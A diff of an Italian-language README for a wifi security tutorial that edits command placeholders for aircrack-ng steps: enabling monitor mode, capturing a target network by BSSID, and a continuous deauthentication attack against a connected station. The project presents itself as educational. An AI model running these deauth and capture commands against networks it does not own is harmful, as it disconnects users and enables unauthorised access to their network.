@@ -2,7 +2,7 @@
 
 Il nostro progetto è stato quello di evidenziare le vulnerabilità di una rete wifi comune a 2.4GHz. Questo progetto nasce solo ed esclusivamente a scopo informativo e vi invitiamo a replicare il progetto con reti create da voi per verificarne le vulnerabilità.
 
-Per seguire questa semplificare i vari comandi di testing, abbiamo creato un tool da eseguire in shell linux. Nella guida troverete sia come usare il tool che i comandi da eseguire manualmente. Ricordiamo inoltre che il tool è completamente source code.
+Per seguire questa guida e semplificare i vari comandi di testing, abbiamo creato un tool da eseguire in shell linux. Nella guida troverete sia come usare il tool che i comandi da eseguire manualmente. Ricordiamo inoltre che il tool è completamente source code. Per eseguire seguire la guida è richiesto un OS Linux con [aircrack-ng](https://www.aircrack-ng.org/) installato (su Kali è preinstallato).
 
 ## $${\color{aqua}Automated \space script}$$
 
@@ -22,7 +22,7 @@ $ ./hashsniffer.sh
 
 ## $${\color{green}Guida \space manuale}$$
 
-Per iniziare ci servirà un OS Linux con scaricato il tool [Aircrack-ng](https://www.aircrack-ng.org/). Possibilmente usate come distro Kali in quanto preinstallato. Iniziamo aprendo un terminale e seguendo i seguenti comandi:
+Iniziamo aprendo un terminale e seguendo i seguenti comandi:
 
 
 ```bash
@@ -43,7 +43,7 @@ Una volta eseguito il comando ci usciranno tutte le schede internet che possedia
 ```bash
 ┌(root💀kali)-[~]
 │
-┕$ sudo airomon-ng start <YOURE WIRELESS EXTENSION>
+┕$ sudo airomon-ng start <SCHEDA DI RETE>
 ```
 
 <div align="center">
@@ -58,7 +58,7 @@ Successivamente per visualizzare tutte le reti disponibili:
 ```bash
 ┌(root💀kali)-[~]
 │
-┕$ sudo airodump-ng wlan0mon
+┕$ sudo airodump-ng <SCHEDA DI RETE>mon
 ```
 
 \
@@ -75,7 +75,7 @@ Tra i risultati dobbiamo copiare il BSSID della rete in questione ed eseguire il
 ```bash
 ┌(root💀kali)-[~]
 │
-┕$ sudo airodump-ng -canale -w NomeFile -d BSSID wlan0mon
+┕$ sudo airodump-ng -canale -w NomeFile -d BSSID <SCHEDA DI RETE>mon
 ```
 
 In questo modo stiamo verificando solo la rete in questione.
@@ -98,7 +98,7 @@ Attacco deauth integrato tramite il comando:
 ```bash
 ┌(root💀kali)-[~]
 │
-┕$ sudo aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
+┕$ sudo aireplay-ng --deauth 0 -a BSSID -c STATION <SCHEDA DI RETE>mon
 ```
 
 <div align="center">
